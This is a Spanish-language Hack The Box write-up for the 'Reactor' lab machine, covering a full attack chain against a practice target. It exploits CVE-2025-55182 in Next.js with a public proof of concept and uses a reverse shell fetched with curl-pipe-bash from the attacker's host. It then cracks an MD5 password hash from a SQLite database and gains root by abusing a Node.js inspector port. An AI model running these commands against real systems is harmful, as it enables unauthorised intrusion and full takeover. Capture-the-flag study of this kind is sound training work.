---
title: Reactor
description: Reactor es una máquina Linux fácil basada en el panel de control de supervisión nuclear ReactorWatch, una aplicación Next.js 15.0.3 / React 19.0.0 accesible en el puerto 3000. La pila es vulnerable a CVE-2025-55182, más conocida como React2Shell, un fallo de deserialización insegura en React Server Components que permite la ejecución remota de código sin autenticación. Utilizando una prueba de concepto pública, conseguimos un punto de acceso como la cuenta de servicio «node» con privilegios reducidos. A partir de ahí, enumeramos el directorio de la aplicación, recuperamos una base de datos SQLite que contiene registros de usuarios y desciframos un hash de contraseña MD5 para obtener credenciales SSH válidas para el usuario «engineer». La escalada de privilegios aprovecha un servicio de monitorización propiedad de root que se inició con el indicador de depuración «--inspect» de Node.js vinculado a un puerto local. Al establecer un túnel hacia ese puerto de depuración y canalizarlo a través del protocolo del inspector V8, ejecutamos código como root y escalamos a un shell root completo.
date: 2026-10-16
toc: true
pin: false
image: assets/img/htb-writeup-reactor/reactor.png
categories:
  - Hack The Box
  - Machines
  - Linux
tags:
  - Linux-Fundamentals
  - Web-Application-Security
  - Exploiting_CVE-2025-55182
  - SQLite-Enumeration
  - Abusing-Node_js-Inspector
---

## 1. Enumeración

### Escaneo de Puertos (Nmap)
Realizamos un escaneo completo de puertos para identificar los servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.135.153 -oG allports
```

**Resultado:**
```text
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```

Posteriormente, realizamos un escaneo más detallado sobre los puertos abiertos:

```bash
nmap -p22,3000 -sCV -Pn 10.129.135.153 -oN targeted
```

**Resultado relevante:**
```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     X-Powered-By: Next.js
|     Content-Type: text/html; charset=utf-8
```

El puerto 3000 aloja una aplicación Next.js. 

### Enumeración Web
Agregamos el dominio a nuestro `/etc/hosts`:
```bash
echo "10.129.135.153 reactor.htb" | sudo tee -a /etc/hosts
```

Al visitar `http://reactor.htb:3000`, encontramos un panel de monitoreo nuclear llamado **ReactorWatch**. Utilizando Wappalyzer o revisando las cabeceras, confirmamos el stack: Next.js y React.

Dado que es una versión reciente, realizamos un escaneo con **Nuclei**:

```bash
nuclei -target http://10.129.135.153:3000
```

**Resultado:**
```text
[CVE-2025-55182] [http] [critical] http://10.129.135.153:3000
```

Nuclei confirma que la aplicación es vulnerable a **CVE-2025-55182 (React2Shell)**.

---

## 2. Foothold (Acceso Inicial)

### Explotación de CVE-2025-55182
Clonamos un PoC público para explotar la vulnerabilidad:

```bash
git clone https://github.com/jensnesten/React2Shell-PoC
cd React2Shell-PoC
```

Verificamos la ejecución de comandos con `whoami`:

```bash
python3 main.py http://10.129.135.153:3000 'whoami'
```

**Resultado:**
```text
[+] Command output:
node
```

Tenemos RCE como el usuario `node`. 

### Reverse Shell
Para obtener una shell interactiva, montamos un servidor HTTP en nuestra máquina atacante con un archivo `index.html` que contiene una reverse shell:

```bash
mkdir www && cd www
echo "/bin/bash -i >& /dev/tcp/10.10.15.202/9001 0>&1" > index.html
python3 -m http.server 8000
```

Ejecutamos el exploit apuntando a nuestro servidor y ejecutando el payload con `curl | bash`:

```bash
python3 main.py http://10.129.135.153:3000 '/usr/bin/curl http://10.10.15.202:8000 | /bin/bash'
```

Recibimos la conexión en nuestro listener:
```bash
nc -lvnp 9001
```
Obtenemos una shell como `node`.

---

## 3. Movimiento Lateral (Usuario Engineer)

### Enumeración de la Base de Datos
Exploramos el directorio de la aplicación:

```bash
node@reactor:/opt/reactor-app$ ls -la
```

Encontramos un archivo `.env` y una base de datos `reactor.db`. Leemos el `.env`:
```bash
DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3
```

Abrimos la base de datos SQLite:
```bash
sqlite3 reactor.db
sqlite> .tables
sensor_logs users
sqlite> SELECT * FROM users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

### Crackeo de Hash
Extraemos los hashes MD5 y los crackeamos con Hashcat (modo 0) usando `rockyou.txt`:

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Resultado:**
```text
39d97110eafe2a9a68639812cd271e8e:reactor1
```

La contraseña del usuario `engineer` es `reactor1`.

### Acceso SSH
Nos conectamos por SSH:
```bash
ssh engineer@10.129.135.153
```
Ingresamos la contraseña `reactor1` y obtenemos acceso como `engineer`. 

Leemos la flag de usuario:
```bash
cat /home/engineer/user.txt
```

---

## 4. Privilege Escalation (Root)

### Enumeración de Puertos Locales
Listamos los puertos en escucha:
```bash
ss -tnlp
```

**Resultado:**
```text
LISTEN 0 511 127.0.0.1:9229 0.0.0.0:*
```

El puerto 9229 está abierto localmente. Al hacer una petición HTTP, el servicio responde:
```bash
curl http://127.0.0.1:9229
# WebSockets request was expected
```

Buscamos referencias a este puerto en los servicios del sistema:
```bash
grep -rn 9229 /etc/systemd/system/
```

**Resultado:**
```text
/etc/systemd/system/uptime-monitor.service:8:ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

El servicio `uptime-monitor` se ejecuta como **root** con el flag `--inspect`, habilitando el depurador de Node.js en el puerto 9229.

### Abuso del Node.js Inspector
Nos conectamos al depurador local:
```bash
node inspect 127.0.0.1:9229
```

Una vez dentro del modo debug, ejecutamos código arbitrario como root. Utilizamos el mismo método de reverse shell que antes:

1. En nuestra máquina atacante, preparamos el `index.html` con la reverse shell en el puerto 9001.
2. En el debugger de Node.js, ejecutamos:

```javascript
exec("process.mainModule.require('child_process').exec('/usr/bin/curl http://10.10.15.202:8000 | bash')")
```

Recibimos la conexión en nuestro listener (`nc -lvnp 9001`) y obtenemos una shell como **root**.

### Flags Finales
Leemos las flags:

```bash
root@reactor:~# cat /root/root.txt
1ac170a9c6afc63b80a65d133fa02d4e

root@reactor:/home/engineer# cat user.txt
d225e688ef345641bbd8be45a5bf0880
```

---
